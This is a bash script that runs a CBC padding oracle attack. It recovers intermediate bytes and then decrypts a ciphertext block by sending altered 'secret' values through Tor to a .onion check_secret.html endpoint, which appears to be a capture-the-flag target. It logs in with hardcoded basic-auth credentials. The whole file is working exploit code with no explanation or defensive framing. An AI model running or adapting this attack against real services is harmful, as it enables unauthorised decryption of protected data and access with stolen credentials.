#!/bin/bash

cipher='ad8bb176da1f40a98385ad0ae9777c3208b78ae57a7fec84092b2cbbaf2ab1c0'

zeroIV=${cipher:0:32}
for hex in {0..15}
do
  echo $hex
  hexIncr=$hex
  hexIncr=$((hexIncr+1))
  hexValue=$(printf "0x%02x" $hexIncr)
  flag=true
  for char in {0..255}
  do
    echo $char
    declare -i i=$char
    byte=$(printf "%X" $char)
    if [ 16 -gt "$char" ]
    then
      byte="0"
      byte+=$(printf "%X" $char)
    else
      byte=$(printf "%X" $char)
    fi
    byte=$(echo $byte | tr A-Z a-z)
    start=$((30-hex*2))
    end=$((start+2))
    firstPart=${cipher:0:$start}
    lastPart=${cipher:32:32}
    complete=$firstPart
    complete+=$byte
    midPart=""
    for (( midIndex=$end; midIndex<=31; midIndex+=2 )); do
      midValue=${zeroIV:midIndex:2}
      hexMid="0x"
      hexMid+=$midValue
      hexMid=$(printf '%X\n' $(( $hexMid ^ $hexValue )))
      hexMid=$(echo $hexMid | tr A-Z a-z)
      varlen=${#hexMid}
      if (( 2 > varlen )); then
        hexMid="0"$hexMid
      fi
      midPart+=$hexMid
    done
    complete+=$midPart
    complete+=$lastPart
    form='secret='
    form+=$complete
    form+='&submit=go'
    while : ; do 
      curlResult=$(curl --max-time 60 --user admin:hammertime -v --socks5-hostname localhost:9050\
      --http0.9 --data-raw $form  http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html 2>&1)
      disconectCheck=$(echo $curlResult | grep -e 'invalid padding' -e 'wrong secret' -e 'secret ok')
      if ! [ -z "$disconectCheck" ]
      then
        break
      fi
    done
    output=$(echo $curlResult | grep 'wrong secret' )
    if ! [ -z "$output" ] 
    then
      hexByte="0x"
      hexByte+=$byte
      iv=$(printf '%X\n' $(( $hexByte ^ $hexValue )))
      iv=$(echo $iv | tr A-Z a-z)
      newIV=$firstPart
      varlen=${#iv}
      if (( 2 > varlen )); then
        iv="0"$iv
      fi
      newIV+=$iv
      echo $iv
      newIV+=${zeroIV:end:$((32-end))}
      zeroIV=$newIV
      echo "Zero IV of " $hex $zeroIV
      flag=false
      break
    fi
  done
  if [ "$flag" = true ] ; then
      hexByte="0x"
      byte=${cipher:$start:2}
      hexByte+=$byte
      iv=$(printf '%X\n' $(( $hexByte ^ $hexValue )))
      iv=$(echo $iv | tr A-Z a-z)
      newIV=$firstPart
      newIV+=$iv
      newIV+=${zeroIV:end:$((32-end))}
      zeroIV=$newIV
      echo "Zero IV of " $hex $zeroIV
      flag=false
  fi
done
echo $zeroIV

clearText=""
for byte in {0..15}
do
  start=$((byte*2))
  ivVal=${cipher:$start:2}
  zeroVal=${zeroIV:$start:2}
  ivHex="0x"$ivVal
  zeroHex="0x"$zeroVal
  clearByte=$(printf '%d\n' $(( $zeroHex ^ $ivHex )))
  clearByte=$(printf "\x$(printf %x $clearByte)")
  clearText+=$clearByte
done
echo $clearText
